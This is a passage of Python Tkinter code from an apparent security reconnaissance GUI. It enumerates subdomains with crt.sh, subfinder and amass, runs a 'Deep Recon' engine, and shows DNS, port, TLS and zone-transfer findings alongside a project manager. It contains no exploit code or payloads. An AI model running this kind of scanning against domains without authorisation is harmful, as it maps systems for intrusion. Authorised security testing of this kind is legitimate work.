                subdomains = []
                if src == "auto":
                    # Phase 0: discover subdomains first
                    def _sublog(m, t='info'): self.root.after(0, lambda mm=m, tt=t: _dr_log(f"  [ENUM] {mm}", tt))
                    _sublog(f"Discovering subdomains for {domain}...", "info")
                    # crt.sh
                    try:
                        from modules.recon.passive import crtsh_lookup
                        crt = crtsh_lookup(domain)
                        subdomains.extend(crt)
                        _sublog(f"crt.sh: {len(crt)} subdomains", "ok")
                    except Exception as e:
                        _sublog(f"crt.sh failed: {e}", "err")
                    # subfinder if available
                    try:
                        import shutil
                        if shutil.which("subfinder"):
                            import subprocess as _sp
                            result = _sp.run(
                                ["subfinder", "-d", domain, "-silent"],
                                capture_output=True, text=True, timeout=60)
                            sf_subs = [l.strip() for l in result.stdout.splitlines() if l.strip()]
                            subdomains.extend(sf_subs)
                            _sublog(f"subfinder: {len(sf_subs)} subdomains", "ok")
                    except Exception as e:
                        _sublog(f"subfinder: {e}", "dim")
                    # amass if available
                    try:
                        import shutil
                        if shutil.which("amass"):
                            import subprocess as _sp, tempfile, os
                            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tf:
                                tmp = tf.name
                            _sp.run(["amass","enum","-passive","-d",domain,"-o",tmp],
                                    capture_output=True, timeout=120)
                            if os.path.exists(tmp):
                                with open(tmp) as f:
                                    am_subs = [l.strip() for l in f if l.strip()]
                                subdomains.extend(am_subs)
                                os.unlink(tmp)
                                _sublog(f"amass: {len(am_subs)} subdomains", "ok")
                    except Exception as e:
                        _sublog(f"amass: {e}", "dim")
                    # Always add the root domain
                    subdomains.append(domain)

                elif src == "project":
                    proj = self.project.get() or domain
                    for fname in ["subdomains_all.txt","subfinder.txt","amass.txt","crtsh.txt"]:
                        p = LOGS_DIR / proj / fname
                        if p.exists():
                            with open(p) as f:
                                subdomains.extend([l.strip() for l in f if l.strip()])
                            _dr_log(f"  Loaded {fname}", "dim")
                    if not subdomains:
                        _dr_log("  No subdomain files found in project logs", "warn")
                        return

                elif src == "file":
                    fpath = self._dr_subs_file.get().strip()
                    if not fpath or not Path(fpath).exists():
                        self.root.after(0, lambda: messagebox.showwarning(
                            "No File", "Select a subdomain file first", parent=self.root))
                        return
                    with open(fpath) as f:
                        subdomains.extend([l.strip() for l in f if l.strip()])

                # Deduplicate
                subdomains = sorted(set(s for s in subdomains
                                        if s and domain in s))
                if not subdomains:
                    _dr_log("  No subdomains to process", "err")
                    return

                # Save subdomain list
                proj_dir = LOGS_DIR / (self.project.get() or domain)
                proj_dir.mkdir(parents=True, exist_ok=True)
                subs_file = proj_dir / "deep_recon_targets.txt"
                with open(subs_file, 'w') as f:
                    f.write('\n'.join(subdomains))
                _dr_log(f"\n  Total unique subdomains: {len(subdomains)}", "ok")
                _dr_log(f"  Saved: {subs_file.name}", "dim")

                def _finding_cb(finding):
                    self.root.after(0, lambda f=finding: _dr_log(
                        f"  🚨 [{f['severity']}] {f['type']} — {f['hostname']}: {f['detail'][:60]}", "ok"))
                    # Auto-save to Findings DB
                    save_finding({
                        "title":       f"{f['type']} on {f['hostname']}",
                        "url":         f"https://{f['hostname']}",
                        "type":        f['type'],
                        "severity":    f['severity'],
                        "cvss_score":  f.get('cvss',''),
                        "description": f['detail'],
                        "poc":         f"Deep Recon finding for {f['hostname']}",
                        "impact":      f['detail'],
                        "project":     self.project.get() or domain,
                        "tool":        "Deep Recon Engine",
                        "status":      "Open",
                    })

                try: workers = int(self._dr_workers.get())
                except Exception: workers = 20

                engine = DeepReconEngine(
                    domain=domain,
                    subdomains=subdomains,
                    output_dir=proj_dir,
                    log_cb=lambda m, t='info': self.root.after(0, lambda mm=m, tt=t: _dr_log(mm, tt)),
                    finding_cb=_finding_cb,
                    max_workers=workers,
                    stop_flag=self._dr_stop,
                )
                results = engine.run()

                # Store for results tabs
                self._dr_results = results
                self._dr_findings = engine.findings

                def _done():
                    nf = len(engine.findings)
                    self._dr_progress.config(
                        text=f"  ✅ Done! {len(results)} subdomains · {nf} findings",
                        fg=RED if nf else GREEN)
                    self._populate_dr_results()
                    self._populate_dr_findings()
                    self._populate_dr_report(engine)
                    self.set_status(
                        f"Deep Recon complete: {len(results)} hosts, {nf} findings",
                        RED if nf else GREEN)
                    self._refresh_findings()
                self.root.after(0, _done)

            threading.Thread(target=_go, daemon=True).start()

        bf1 = mk_frame(p1, bg=BG2); bf1.pack(fill='x', pady=(8,0))
        self._dr_start_btn = mk_btn(bf1, "🕳️ Start Deep Recon", _start_deep_recon, RED)
        self._dr_start_btn.pack(side='left', ipady=6, padx=(0,8))
        mk_btn(bf1, "⬛ Stop", lambda: (self._dr_stop.set(),
               self._dr_progress.config(text="  ⬛ Stopping...", fg=YELLOW)),
               YELLOW, small=True).pack(side='left', padx=4)
        mk_btn(bf1, "🗑 Clear", lambda: (
            dr_log.config(state='normal'),
            dr_log.delete('1.0','end'),
            dr_log.config(state='disabled'),
            self._dr_progress.config(text="  Ready", fg=FG3)
        ), FG3, small=True).pack(side='left', padx=4)

        # Init storage
        self._dr_results  = {}
        self._dr_findings = []

        # ── Sub-tab 2: Results Table ───────────────────────────────
        p2 = mk_frame(f2, bg=BG2); p2.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p2, "RESULTS — Per-Subdomain Summary", "📊").pack(fill='x', pady=(0,8))

        # Filter
        rf = mk_frame(p2, bg=BG2); rf.pack(fill='x', pady=(0,6))
        tk.Label(rf, text="Filter:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._dr_filter = tk.StringVar()
        mk_entry(rf, var=self._dr_filter, w=28).pack(side='left', padx=8, ipady=3)
        self._dr_filter.trace_add('write', lambda *_: self._populate_dr_results())
        tk.Label(rf, text="  Show:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._dr_show = tk.StringVar(value="all")
        for v, l in [("all","All"),("live","Live only"),("findings","With findings"),("ports","Open ports")]:
            ttk.Radiobutton(rf, text=l, variable=self._dr_show, value=v,
                           command=self._populate_dr_results).pack(side='left', padx=6)

        dr_cols = ('Hostname','IP','Status','Title','Tech','CDN','Ports','Findings')
        self._dr_tree = mk_tree(p2, columns=dr_cols, show='headings', height=18)
        dr_wsz = {'Hostname':220,'IP':120,'Status':55,'Title':200,
                   'Tech':140,'CDN':100,'Ports':70,'Findings':70}
        for c in dr_cols:
            self._dr_tree.heading(c, text=c, anchor='w')
            self._dr_tree.column(c, width=dr_wsz.get(c,80), anchor='w')
        self._dr_tree.tag_configure('has_findings', foreground=RED, background=BG3)
        self._dr_tree.tag_configure('live',         foreground=GREEN, background=BG3)
        self._dr_tree.tag_configure('dead',         foreground=FG3, background=BG3)
        self._dr_tree.tag_configure('redirect',     foreground=YELLOW, background=BG3)

        vsb2 = ttk.Scrollbar(p2, orient='vertical',   command=self._dr_tree.yview)
        hsb2 = ttk.Scrollbar(p2, orient='horizontal',  command=self._dr_tree.xview)
        self._dr_tree.configure(yscrollcommand=vsb2.set, xscrollcommand=hsb2.set)
        tw2 = mk_frame(p2, bg=BG2); tw2.pack(fill='both', expand=True)
        self._dr_tree.pack(side='left', fill='both', expand=True, in_=tw2)
        vsb2.pack(side='right', fill='y', in_=tw2)
        hsb2.pack(side='bottom', fill='x')
        self._dr_stats_lbl = tk.Label(p2, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._dr_stats_lbl.pack(anchor='w', pady=(4,0))
        self._dr_tree.bind('<Double-1>', self._dr_show_detail)

        # ── Sub-tab 3: Findings ────────────────────────────────────
        p3 = mk_frame(f3, bg=BG2); p3.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p3, "SECURITY FINDINGS — Auto-saved to Findings tab", "🚨").pack(fill='x', pady=(0,8))
        f_cols = ('Severity','Type','Hostname','Detail','CVSS')
        self._dr_find_tree = mk_tree(p3, columns=f_cols, show='headings', height=20)
        f_wsz = {'Severity':80,'Type':180,'Hostname':200,'Detail':340,'CVSS':55}
        for c in f_cols:
            self._dr_find_tree.heading(c, text=c, anchor='w')
            self._dr_find_tree.column(c, width=f_wsz.get(c,80), anchor='w')
        for sev, clr in [('CRITICAL',RED),('HIGH',YELLOW),('MEDIUM',ACCENT),('LOW',GREEN),('INFO',FG2)]:
            self._dr_find_tree.tag_configure(sev, foreground=clr)
        vsb3 = ttk.Scrollbar(p3, orient='vertical',   command=self._dr_find_tree.yview)
        hsb3 = ttk.Scrollbar(p3, orient='horizontal',  command=self._dr_find_tree.xview)
        self._dr_find_tree.configure(yscrollcommand=vsb3.set, xscrollcommand=hsb3.set)
        tw3 = mk_frame(p3, bg=BG2); tw3.pack(fill='both', expand=True)
        self._dr_find_tree.pack(side='left', fill='both', expand=True, in_=tw3)
        vsb3.pack(side='right', fill='y', in_=tw3)
        hsb3.pack(side='bottom', fill='x')

        # ── Sub-tab 4: Full Report ────────────────────────────────
        p4 = mk_frame(f4, bg=BG2); p4.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(p4, "DEEP RECON REPORT", "📋").pack(fill='x', pady=(0,8))
        self._dr_report_txt = tk.Text(p4, bg=TERM_BG, fg=TERM_FG,
                                       font=(_MONO_FACE,9), relief='flat', bd=0,
                                       state='disabled', wrap='none',
                                       padx=10, pady=8)
        vsb4 = ttk.Scrollbar(p4, orient='vertical',   command=self._dr_report_txt.yview)
        hsb4 = ttk.Scrollbar(p4, orient='horizontal',  command=self._dr_report_txt.xview)
        self._dr_report_txt.configure(yscrollcommand=vsb4.set, xscrollcommand=hsb4.set)
        tw4 = mk_frame(p4, bg=BG2); tw4.pack(fill='both', expand=True)
        self._dr_report_txt.pack(side='left', fill='both', expand=True, in_=tw4)
        vsb4.pack(side='right', fill='y', in_=tw4)
        hsb4.pack(side='bottom', fill='x')
        bf4 = mk_frame(p4, bg=BG2); bf4.pack(fill='x', pady=(6,0))
        mk_btn(bf4, "📋 Copy", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(self._dr_report_txt.get('1.0','end')),
            self.root.update()), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf4, "💾 Save TXT", self._dr_save_report, GREEN, small=True).pack(side='left', padx=4)

    def _populate_dr_results(self):
        if not hasattr(self, '_dr_tree'): return
        results = getattr(self, '_dr_results', {})
        filt    = getattr(self, '_dr_filter', tk.StringVar()).get().lower()
        show    = getattr(self, '_dr_show',   tk.StringVar()).get()
        self._dr_tree.delete(*self._dr_tree.get_children())
        shown = 0
        for host, data in results.items():
            if filt and filt not in host.lower(): continue
            ips    = data.get("dns",{}).get("A",[])
            ip     = ips[0] if ips else ""
            http   = data.get("http",{})
            status = http.get("status",0)
            title  = http.get("title","")[:40]
            tech   = ", ".join(http.get("tech",[])[:3])
            cdn    = data.get("infra",{}).get("cdn","")
            ports  = len(data.get("ports",[]))
            nfinds = len(data.get("findings",[]))
            # Filter
            if show == "live" and status not in (200,201,204,301,302): continue
            if show == "findings" and not nfinds: continue
            if show == "ports" and not ports: continue
            tag = ('has_findings' if nfinds else
                   'live'         if status in (200,201,204) else
                   'redirect'     if status in (301,302,307) else
                   'dead')
            self._dr_tree.insert('','end', values=(
                host, ip, str(status) or "—", title,
                tech, cdn, str(ports) if ports else "—",
                f"🚨 {nfinds}" if nfinds else "—"
            ), tags=(tag,))
            shown += 1
        live  = sum(1 for d in results.values() if d.get("http",{}).get("status",0) in (200,201,204))
        finds = sum(len(d.get("findings",[])) for d in results.values())
        ports = sum(1 for d in results.values() if d.get("ports"))
        if hasattr(self, '_dr_stats_lbl'):
            self._dr_stats_lbl.config(
                text=(f"  Showing: {shown}  │  Live: {live}  │  "
                      f"With findings: {finds}  │  With open ports: {ports}"),
                fg=FG2)

    def _populate_dr_findings(self):
        if not hasattr(self, '_dr_find_tree'): return
        findings = getattr(self, '_dr_findings', [])
        self._dr_find_tree.delete(*self._dr_find_tree.get_children())
        sev_order = {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}
        for f in sorted(findings, key=lambda x: sev_order.get(x.get('severity','INFO'), 5)):
            sev = f.get('severity','INFO')
            self._dr_find_tree.insert('','end', values=(
                sev, f.get('type',''), f.get('hostname',''),
                f.get('detail','')[:80], f.get('cvss','')
            ), tags=(sev,))

    def _populate_dr_report(self, engine=None):
        if not hasattr(self, '_dr_report_txt'): return
        results  = getattr(self, '_dr_results', {})
        findings = getattr(self, '_dr_findings', [])
        lines = []
        lines.append(f"DEEP RECON REPORT — {getattr(self,'_dr_domain',tk.StringVar()).get()}")
        lines.append(f"Generated: {datetime.now().isoformat()}")
        lines.append(f"Subdomains: {len(results)}  |  Findings: {len(findings)}")
        lines.append("=" * 60)
        if findings:
            lines.append("\n🚨 FINDINGS (sorted by severity)")
            lines.append("-" * 40)
            sev_order = {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}
            for f in sorted(findings, key=lambda x: sev_order.get(x.get('severity','INFO'),5)):
                lines.append(f"[{f['severity']}] {f['type']}")
                lines.append(f"  Host:   {f['hostname']}")
                lines.append(f"  Detail: {f['detail']}")
                lines.append(f"  CVSS:   {f.get('cvss','')}\n")
        lines.append("\n" + "=" * 60)
        lines.append("PER-SUBDOMAIN DETAILS")
        lines.append("=" * 60)
        for host, data in results.items():
            dns  = data.get("dns",{})
            http = data.get("http",{})
            infra= data.get("infra",{})
            tls  = data.get("tls",{})
            lines.append(f"\n{'─'*50}")
            lines.append(f"TARGET: {host}")
            for rtype in ["A","AAAA","CNAME","MX","NS","TXT"]:
                vals = dns.get(rtype,[])
                if vals: lines.append(f"  {rtype:6s}: {', '.join(vals[:3])}")
            for sec in ["SPF","DMARC","DKIM"]:
                vals = dns.get(sec,[])
                if vals: lines.append(f"  {sec:6s}: {vals[0][:80]}")
            if infra.get("org"):
                lines.append(f"  INFRA:  {infra.get('ip','')} | {infra.get('asn','')} | {infra.get('org','')} | {infra.get('country','')}")
            if infra.get("cdn"):
                lines.append(f"  CDN:    {infra['cdn']}")
            if http.get("status"):
                lines.append(f"  HTTP:   [{http['status']}] {http.get('title','')[:60]}")
                if http.get("tech"):
                    lines.append(f"  TECH:   {', '.join(http['tech'])}")
            if tls.get("subject"):
                lines.append(f"  TLS:    {tls['subject'].get('commonName','')} | Exp: {tls.get('valid_to','')} ({tls.get('days_left','?')}d)")
            if data.get("ports"):
                lines.append(f"  PORTS:  {', '.join(str(p['port'])+'/'+p['service'] for p in data['ports'])}")
            if data.get("zone_xfer",{}).get("vulnerable"):
                lines.append(f"  [!!!] ZONE TRANSFER VULNERABLE")
        content = "\n".join(lines)
        self._dr_report_txt.config(state='normal')
        self._dr_report_txt.delete('1.0','end')
        self._dr_report_txt.insert('end', content)
        self._dr_report_txt.config(state='disabled')

    def _dr_save_report(self):
        domain  = getattr(self,'_dr_domain',tk.StringVar()).get() or "target"
        proj_dir = LOGS_DIR / (self.project.get() or domain)
        proj_dir.mkdir(parents=True, exist_ok=True)
        out = proj_dir / "deep_recon_report.txt"
        try:
            out.write_text(self._dr_report_txt.get('1.0','end'), encoding='utf-8')
            self.set_status(f"Report saved: {out.name}", GREEN)
        except Exception as e:
            messagebox.showerror("Save Error", str(e), parent=self.root)

    def _dr_show_detail(self, _e=None):
        """Show full detail popup for selected subdomain."""
        sel = self._dr_tree.selection()
        if not sel: return
        host = self._dr_tree.item(sel[0])['values'][0]
        results = getattr(self,'_dr_results',{})
        data = results.get(str(host))
        if not data: return
        win = tk.Toplevel(self.root)
        win.title(f"Deep Recon: {host}")
        win.geometry("820x640"); win.configure(bg=BG)
        win.lift(); win.focus_force()
        tk.Frame(win, bg=ACCENT, height=3).pack(fill='x')
        tk.Label(win, text=host, bg=BG, fg=ACCENT, font=MONO_H).pack(pady=(10,6))
        nb = ttk.Notebook(win); nb.pack(fill='both', expand=True, padx=12, pady=8)
        import json as _json
        for tab_name, section_key, formatter in [
            ("🌐 DNS",   "dns",   lambda d: '\n'.join(f"  {k:8s}: {', '.join(v) if isinstance(v,list) else v}" for k,v in d.items() if v)),
            ("🏗️ Infra", "infra", lambda d: '\n'.join(f"  {k:12s}: {v}" for k,v in d.items() if v)),
            ("🔐 TLS",   "tls",   lambda d: '\n'.join(f"  {k:14s}: {v}" for k,v in d.items() if v and k != 'errors')),
            ("🌍 HTTP",  "http",  lambda d: '\n'.join(f"  {k:14s}: {v}" for k,v in d.items() if v and k not in ('headers','errors'))),
            ("🔌 Ports", "ports", lambda d: '\n'.join(f"  {p['port']:5d}  {p['service']}" for p in d) if isinstance(d,list) else str(d)),
            ("📄 Full JSON", None, lambda d: _json.dumps(data, indent=2, default=str)),
        ]:
            tf = tk.Frame(nb, bg=BG2); nb.add(tf, text=f"  {tab_name}  ")
            txt = mk_stext(tf, h=20, bg=BG3, fg=FG)
            txt.pack(fill='both', expand=True, padx=8, pady=8)
            txt.config(state='normal')
            try:
                section = data if section_key is None else data.get(section_key,{})
                txt.insert('end', formatter(section))
            except Exception:
                txt.insert('end', str(data.get(section_key,{})))
            txt.config(state='disabled')
        mk_btn(win, "✕ Close", win.destroy, FG3, small=True).pack(pady=8)

    # ═════════════════════════════════════════════════════════════
    #  📁  PROJECTS TAB — v4
    # ═════════════════════════════════════════════════════════════
    def _build_projects_tab(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "PROJECTS — Select to load all findings & results", "📁").pack(fill='x', pady=(0,8))

        # Top bar
        top = mk_frame(pad, bg=BG2); top.pack(fill='x', pady=(0,8))
        self._proj_search_var = tk.StringVar()
        mk_entry(top, var=self._proj_search_var, w=28, placeholder="Search projects...").pack(side='left', padx=(0,8), ipady=3)
        self._proj_search_var.trace_add('write', lambda *_: self._proj_refresh())
        mk_btn(top, "🔄 Refresh",    self._proj_refresh,      FG3,   small=True).pack(side='left', padx=4)
        mk_btn(top, "+ New Project", self._new_project,        GREEN, small=True).pack(side='left', padx=4)
        mk_btn(top, "📂 Open Logs",  lambda: open_folder(str(LOGS_DIR)), FG2, small=True).pack(side='left', padx=4)

        # Split pane: projects left, detail right
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)

        # LEFT: project list
        left = mk_frame(paned, bg=BG2); paned.add(left, width=340)
        cols = ('Name','Findings','Files','Last Active')
        self._proj_tree = mk_tree(left, columns=cols, show='headings', height=30)
        for c, w in [('Name',160),('Findings',65),('Files',55),('Last Active',110)]:
            self._proj_tree.heading(c, text=c, anchor='w')
            self._proj_tree.column(c, width=w, anchor='w')
        self._proj_tree.tag_configure('active',  foreground=ACCENT, background=BG3)
        self._proj_tree.tag_configure('normal',  foreground=FG,     background=BG3)
        self._proj_tree.tag_configure('no_data', foreground=FG3,    background=BG3)
        vsb_p = ttk.Scrollbar(left, orient='vertical', command=self._proj_tree.yview)
        self._proj_tree.configure(yscrollcommand=vsb_p.set)
        tf_p = mk_frame(left, bg=BG2); tf_p.pack(fill='both', expand=True)
        self._proj_tree.pack(side='left', fill='both', expand=True, in_=tf_p)
        vsb_p.pack(side='right', fill='y', in_=tf_p)
        self._proj_tree.bind('<<TreeviewSelect>>', self._proj_on_select)
        self._proj_tree.bind('<Double-1>', lambda e: self._proj_load_selected())

        # RIGHT: detail panel
        right = mk_frame(paned, bg=BG2); paned.add(right)
        # Project name header
        self._proj_detail_name = tk.Label(right, text="Select a project →",
                                           bg=BG2, fg=ACCENT, font=MONO_B)
        self._proj_detail_name.pack(anchor='w', padx=12, pady=(10,4))
        self._proj_detail_meta = tk.Label(right, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._proj_detail_meta.pack(anchor='w', padx=12, pady=(0,6))

        # Sub-tabs: Findings / Results / Files
        nb3 = ttk.Notebook(right); nb3.pack(fill='both', expand=True, padx=8, pady=4)
        fnd_f = tk.Frame(nb3, bg=BG2); nb3.add(fnd_f, text="  🚩 Findings  ")
        res_f = tk.Frame(nb3, bg=BG2); nb3.add(res_f, text="  📊 Result Files  ")

        # Findings mini-tree
        fcols = ('Severity','Title','Type','Status')
        self._proj_findings_tree = mk_tree(fnd_f, columns=fcols, show='headings', height=14)
        for c, w in [('Severity',70),('Title',240),('Type',90),('Status',80)]:
            self._proj_findings_tree.heading(c, text=c, anchor='w')
            self._proj_findings_tree.column(c, width=w, anchor='w')
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'):
            self._proj_findings_tree.tag_configure(sev,
                foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        vsb_f2 = ttk.Scrollbar(fnd_f, orient='vertical', command=self._proj_findings_tree.yview)
        self._proj_findings_tree.configure(yscrollcommand=vsb_f2.set)
        tf_f2 = mk_frame(fnd_f, bg=BG2); tf_f2.pack(fill='both', expand=True)
        self._proj_findings_tree.pack(side='left', fill='both', expand=True, in_=tf_f2)
        vsb_f2.pack(side='right', fill='y', in_=tf_f2)
        self._proj_findings_tree.bind('<Double-1>', self._proj_open_finding)
        # Finding detail
        self._proj_find_det = mk_stext(fnd_f, h=6, bg=BG3, fg=FG)
        self._proj_find_det.pack(fill='x', pady=(4,0), padx=4)

        # Files tree
        fcols2 = ('File','Category','Size','Lines')
        self._proj_files_tree = mk_tree(res_f, columns=fcols2, show='headings', height=16)
        for c, w in [('File',200),('Category',100),('Size',65),('Lines',65)]:
            self._proj_files_tree.heading(c, text=c, anchor='w')
            self._proj_files_tree.column(c, width=w, anchor='w')
        self._proj_files_tree.tag_configure('has_data', foreground=GREEN, background=BG3)
        self._proj_files_tree.tag_configure('empty',    foreground=FG3, background=BG3)
        vsb_r2 = ttk.Scrollbar(res_f, orient='vertical', command=self._proj_files_tree.yview)
        self._proj_files_tree.configure(yscrollcommand=vsb_r2.set)
        tf_r2 = mk_frame(res_f, bg=BG2); tf_r2.pack(fill='both', expand=True)
        self._proj_files_tree.pack(side='left', fill='both', expand=True, in_=tf_r2)
        vsb_r2.pack(side='right', fill='y', in_=tf_r2)
        self._proj_files_tree.bind('<Double-1>', self._proj_open_file)

        # Buttons
        bf_p = mk_frame(pad, bg=BG2); bf_p.pack(fill='x', pady=(6,0))
        mk_btn(bf_p, "✅ Load as Active Project", self._proj_load_selected, ACCENT).pack(side='left', padx=4, ipady=5)
        mk_btn(bf_p, "🗑 Delete Project",         self._proj_delete,        RED,   small=True).pack(side='left', padx=4)
        mk_btn(bf_p, "📂 Open Folder",            self._proj_open_folder,   FG2,   small=True).pack(side='left', padx=4)

        self._current_proj_detail = None
        self._proj_refresh()

    def _proj_refresh(self):
        if not hasattr(self, '_proj_tree'): return
        search = getattr(self,'_proj_search_var',tk.StringVar()).get().lower()
        self._proj_tree.delete(*self._proj_tree.get_children())
        projects = load_projects()
        active = self.project.get()

        # Also discover projects from logs dir
        discovered = set(p['name'] for p in projects)
        if LOGS_DIR.exists():
            for d in LOGS_DIR.iterdir():
                if d.is_dir() and d.name not in discovered:
                    projects.append({"name":d.name,"created":""})

        for proj in projects:
            name = proj.get('name','')
            if search and search not in name.lower(): continue
            proj_dir = LOGS_DIR / name
            # Count findings
            finds = [f for f in load_findings() if f.get('project') == name]
            # Count files
            files = list(proj_dir.glob("*.txt")) + list(proj_dir.glob("*.json")) if proj_dir.exists() else []
            files = [f for f in files if f.stat().st_size > 0]
            # Last modified
            last = ""
            if proj_dir.exists():
                try:
                    all_f = list(proj_dir.rglob("*"))
                    if all_f:
                        latest = max(all_f, key=lambda p: p.stat().st_mtime if p.is_file() else 0)
                        from datetime import datetime
                        last = datetime.fromtimestamp(latest.stat().st_mtime).strftime("%m-%d %H:%M")
                except Exception: pass
            tag = 'active' if name == active else ('normal' if files or finds else 'no_data')
            prefix = "▶ " if name == active else "  "
            # Ensure tag has background for visibility
            self._proj_tree.insert('', 'end',
                values=(f"{prefix}{name}", len(finds), len(files), last),
                tags=(tag,), iid=f"proj_{name}")

    def _proj_on_select(self, _e=None):
        sel = self._proj_tree.selection()
        if not sel: return
        name = str(self._proj_tree.item(sel[0])['values'][0]).strip().lstrip('▶ ')
        self._current_proj_detail = name
        self._proj_load_detail(name)

    def _proj_load_detail(self, name):
        if not hasattr(self,'_proj_detail_name'): return
        self._proj_detail_name.config(text=f"📁  {name}")
        proj_dir = LOGS_DIR / name
        files = list(proj_dir.rglob("*")) if proj_dir.exists() else []
        files = [f for f in files if f.is_file() and f.stat().st_size > 0]
        finds = [f for f in load_findings() if f.get('project') == name]
        self._proj_detail_meta.config(
            text=f"Files: {len(files)}  ·  Findings: {len(finds)}  ·  Path: {proj_dir}")

        # Load findings
        self._proj_findings_tree.delete(*self._proj_findings_tree.get_children())
        for f in sorted(finds, key=lambda x: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(x.get('severity','INFO').upper(),5)):
            sev = f.get('severity','INFO').upper()
            self._proj_findings_tree.insert('','end', values=(
                sev, f.get('title','')[:50], f.get('type','')[:20], f.get('status','Open')
            ), tags=(sev,), iid=f"f_{f.get('id',id(f))}")

        # Load files
        self._proj_files_tree.delete(*self._proj_files_tree.get_children())
        for fp in sorted(files, key=lambda x: x.stat().st_mtime, reverse=True):
            try:
                sz = fp.stat().st_size
                sz_str = f"{sz//1024}KB" if sz>1024 else f"{sz}B"
                n = fp.name.lower()
                cat = ("Subdomains" if any(k in n for k in ["subfinder","amass","subdomain","crt"])
                       else "URLs" if any(k in n for k in ["url","katana","wayback","gau"])
                       else "Dorks" if "dork" in n
                       else "OSINT" if any(k in n for k in ["osint","asn","email","favicon"])
                       else "HTTP" if "httpx" in n or "header" in n
                       else "AI" if "ai_exploit" in str(fp.parent)
                       else "Other")
                try:
                    lines = len(fp.read_text(errors='replace').splitlines())
                except Exception: lines = 0
                tag = 'has_data' if lines > 0 else 'empty'
                self._proj_files_tree.insert('','end', values=(fp.name, cat, sz_str, lines),
                                              tags=(tag,), iid=str(fp))
            except Exception: pass

    def _proj_load_selected(self):
        sel = self._proj_tree.selection()
        if not sel: return
        name = str(self._proj_tree.item(sel[0])['values'][0]).strip().lstrip('▶ ')
        self.project.set(name)
        self._on_project_change()
        self._proj_refresh()
        self.set_status(f"Active project: {name}", ACCENT)

    def _proj_open_finding(self, _e=None):
        sel = self._proj_findings_tree.selection()
        if not sel: return
        fid = str(sel[0]).replace("f_","")
        f = next((x for x in load_findings() if str(x.get('id','')) == fid), None)
        if not f: return
        self._proj_find_det.config(state='normal'); self._proj_find_det.delete('1.0','end')
        import json as _j
        for k in ['title','type','severity','url','description','poc','impact','status']:
            v = f.get(k,'')
            if v: self._proj_find_det.insert('end', f"{k.upper()}: {v}\n")
        self._proj_find_det.config(state='disabled')

    def _proj_open_file(self, _e=None):
        sel = self._proj_files_tree.selection()
        if not sel: return
        fpath = Path(str(sel[0]))
        if not fpath.exists(): return
        try:
            content = fpath.read_text(errors='replace')
            win = tk.Toplevel(self.root)
            win.title(f"📄 {fpath.name}")
            win.configure(bg=BG); win.geometry("900x600")
            win.lift()
            tk.Frame(win, bg=ACCENT, height=2).pack(fill='x')
            tk.Label(win, text=f"  {fpath}",
                     bg=BG, fg=FG3, font=MONO_T).pack(anchor='w', padx=8, pady=4)
            txt = mk_stext(win, h=30)
            txt.pack(fill='both', expand=True, padx=8, pady=4)
            txt.config(state='normal'); txt.insert('end', content)
            txt.config(state='disabled'); txt.see('1.0')
            # Button row
            bf = mk_frame(win, bg=BG); bf.pack(fill='x', padx=8, pady=4)
            mk_btn(bf, "📋 Copy All", lambda: (
                self.root.clipboard_clear(),
                self.root.clipboard_append(content),
                self.root.update()),
                ACCENT, small=True).pack(side='left', padx=4)
            mk_btn(bf, "✕ Close", win.destroy, FG3, small=True).pack(side='right', padx=4)
        except Exception as e:
            messagebox.showerror("Error", str(e), parent=self.root)

    def _proj_delete(self):
        sel = self._proj_tree.selection()
        if not sel: return
        name = str(self._proj_tree.item(sel[0])['values'][0]).strip().lstrip('▶ ')
        if not messagebox.askyesno("Delete", f"Delete project '{name}'?\nThis will NOT delete log files.", parent=self.root): return
        projects = [p for p in load_projects() if p.get('name') != name]
        with open(DB_DIR/"projects.json","w") as f: json.dump({"projects":projects},f,indent=2)
        self._proj_refresh()
        self.set_status(f"Project deleted: {name}", GREEN)

    def _proj_open_folder(self):
        sel = self._proj_tree.selection()
        if not sel: return
        name = str(self._proj_tree.item(sel[0])['values'][0]).strip().lstrip('▶ ')
        folder = LOGS_DIR / name
        folder.mkdir(parents=True, exist_ok=True)
        open_folder(str(folder))

    # ═══ HELPER: Generic single-tab scanner builder ═══════════════
    def _mk_scanner_tab(self, frame, title, desc_lines, run_fn,
                         url_label="Target URL:", btn_label="▶ Run Scan",
                         btn_color=None, extra_fields=None):
        """Build a standard scanner tab with URL input + terminal output."""
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, title, "🔍").pack(fill='x', pady=(0,8))
        crd = mk_card(pad, accent_top=True); crd.pack(fill='x', pady=(0,10))
        for line in desc_lines:
            tk.Label(crd, text=f"  {line}", bg=BG3, fg=FG2, font=MONO_S,
                     justify='left').pack(anchor='w', padx=4, pady=1)
        tk.Frame(crd, height=4, bg=BG3).pack()
        # URL field
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text=url_label, bg=BG2, fg=FG3, font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
        url_var = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "https://")
        mk_entry(r1, var=url_var, w=50).pack(side='left', ipady=3, fill='x', expand=True)
        mk_btn(r1, "← Target", lambda: url_var.set(f"https://{self.project.get()}" if self.project.get() else ""),
               FG3, small=True).pack(side='left', padx=4)
        # Extra fields
        extra_vars = {}
